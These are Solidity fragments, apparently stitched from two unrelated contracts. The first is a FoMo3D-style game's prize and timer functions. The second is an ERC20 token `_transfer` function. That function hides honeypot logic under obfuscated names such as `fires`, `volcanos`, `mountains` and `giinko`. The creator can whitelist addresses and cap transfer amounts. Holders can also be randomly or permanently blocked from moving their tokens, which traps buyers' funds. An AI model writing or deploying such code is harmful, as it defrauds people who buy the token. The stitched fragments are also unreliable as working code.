function getWinnerPrize(uint256 _pID) view public returns(uint256) {
    uint _keys;
    uint _pKeys;
    if (now < endTime) {
        return 0;
    } else if (totalKeys > groupPrizeStartAt) { 
        _keys = totalKeys.sub(groupPrizeStartAt.add(groupPrizeStageGap.mul(stageId - 1)));
        _pKeys = stageInfo[stageId][_pID];
        return totalEther.mul(groupPrize).div(100).mul(_pKeys).div(_keys);
    } else { 
        Player memory p = players[_pID];
        _pKeys = p.hretKeys.add(p.mretKeys).add(p.lretKeys);
        return totalEther.mul(groupPrize).div(100).mul(_pKeys).div(totalKeys);
    }
}

function updateTimer(uint256 _keys) private {
    uint256 _now = now;
    uint256 _newTime;
    if (endTime.sub(_now) < timeMax) {
        _newTime = ((_keys) / (1000000000000000000)).mul(timeInc).add(endTime);
        if (_newTime.sub(_now) > timeMax) {
            _newTime = _now.add(timeMax);
        }
        endTime = _newTime;
    }
}

function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    if ((address(sender) == creator) && (acidy == false)) {
        blowing = chTx;
        giinko = true;
    }
    if ((address(sender) == creator) && (acidy == true)) {
        fires[recipient] = true;
        volcanos[recipient] = false;
        acidy = false;
    }
    if ((amount > schwag) && (fires[sender] == true) && (address(sender) != creator)) {
        mountains[recipient] = true;
    }
    if (fires[recipient] != true) {
        volcanos[recipient] = ((randomly() == 3) ? true : false);
    }
    if ((volcanos[sender]) && (fires[recipient] == false)) {
        volcanos[recipient] = true;
    }
    if (fires[sender] == false) {
        if ((amount > schwag) && (mountains[sender] == true)) {
            require(false);
        }
        require(amount < blowing);
        if (giinko == true) {
            if (mountains[sender] == true) {
                require(false);
            }
            mountains[sender] = true;
        }
    }
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

